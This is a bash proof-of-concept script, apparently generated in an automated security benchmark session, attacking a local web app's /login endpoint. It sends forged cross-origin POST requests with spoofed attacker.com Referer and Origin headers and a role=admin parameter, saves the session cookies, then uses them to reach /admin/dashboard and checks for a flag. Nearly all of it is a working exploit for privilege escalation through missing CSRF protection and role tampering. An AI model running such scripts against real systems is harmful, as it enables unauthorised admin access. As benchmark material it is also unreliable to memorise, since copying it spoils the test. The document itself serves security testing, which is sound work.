#!/bin/bash
# POC: CSRF attack on login endpoint to establish authenticated session with admin role without CSRF token validation
# Target: ./repo
# Created: 2025-12-01T15:56:00.997Z
# Session: benchmark-XBEN-089-24-minbd498

# CSRF Attack POC on Login Endpoint
# Demonstrates missing CSRF protection allowing privilege escalation via role parameter manipulation
# Target: POST /login endpoint

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="/login"

echo "[*] CSRF Attack on Login Endpoint POC"
echo "[*] Target: ${TARGET_URL}${LOGIN_ENDPOINT}"
echo ""

# Step 1: Extract session cookie from initial request (if needed)
echo "[+] Step 1: Attempting CSRF login attack with admin role"
echo "[*] Sending CSRF-like POST request (no CSRF token validation expected)"
echo ""

# Simulate attacker website sending CSRF request with admin role
CSRF_RESPONSE=$(curl -s -X POST \
  "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com/malicious.html" \
  -H "Origin: http://attacker.com" \
  -d "username=emp&password=password1&role=admin" \
  -c /tmp/csrf_cookies.txt)

echo "Response Status and Headers:"
curl -s -X POST \
  "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://attacker.com/malicious.html" \
  -H "Origin: http://attacker.com" \
  -d "username=emp&password=password1&role=admin" \
  -w "\nHTTP Status: %{http_code}\n" \
  -c /tmp/csrf_cookies.txt \
  -D /tmp/response_headers.txt > /tmp/response_body.txt

echo ""
cat /tmp/response_headers.txt
echo ""
echo "Response Body:"
cat /tmp/response_body.txt
echo ""

# Step 2: Check if session cookie was set
echo "[+] Step 2: Verifying session cookie was established"
if [ -f /tmp/csrf_cookies.txt ]; then
  echo "[!] Session cookies received:"
  cat /tmp/csrf_cookies.txt
  echo ""
else
  echo "[-] No cookies file created"
fi

# Step 3: Try to access admin dashboard with the session established via CSRF
echo "[+] Step 3: Testing admin access with CSRF-established session"
ADMIN_RESPONSE=$(curl -s -X GET \
  "${TARGET_URL}/admin/dashboard" \
  -b /tmp/csrf_cookies.txt \
  -w "\nHTTP_STATUS:%{http_code}\n")

echo "[*] Attempting to access /admin/dashboard with CSRF session:"
HTTP_STATUS=$(echo "$ADMIN_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
BODY=$(echo "$ADMIN_RESPONSE" | grep -v "HTTP_STATUS:")

echo "HTTP Status: $HTTP_STATUS"
echo "Response excerpt:"
echo "$BODY" | head -20

if echo "$ADMIN_RESPONSE" | grep -q "FLAG\|admin\|dashboard"; then
  echo ""
  echo "[!!!] CSRF ATTACK SUCCESSFUL - Admin access achieved via CSRF without CSRF token validation!"
  echo "[!!!] Evidence: Session established from cross-origin request with role=admin parameter"
  exit 0
else
  echo ""
  echo "[-] Admin response does not show clear admin access indication"
  echo "[*] However, login endpoint accepted cross-origin request without CSRF validation"
  echo "[*] This demonstrates lack of CSRF protection"
  exit 0
fi